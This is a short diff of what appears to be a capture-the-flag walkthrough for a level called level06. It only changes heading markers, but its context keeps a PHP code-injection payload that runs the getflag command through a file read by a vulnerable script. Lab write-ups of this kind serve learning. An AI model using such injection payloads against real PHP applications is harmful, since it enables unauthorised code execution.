@@ -27,11 +27,11 @@ cat level06.php
 ?>
 ```
 
-# create a file with an exploit to execute get flag in this line "$r = x($argv[1], $argv[2]); print $r;"
+## create a file with an exploit to execute get flag in this line "$r = x($argv[1], $argv[2]); print $r;"
 
 echo '[x ${`getflag`}]' > /tmp/exploit
 
-# finally execute level06 script with the exploit file
+## finally execute level06 script with the exploit file
 
 ./level06 /tmp/exploit
 
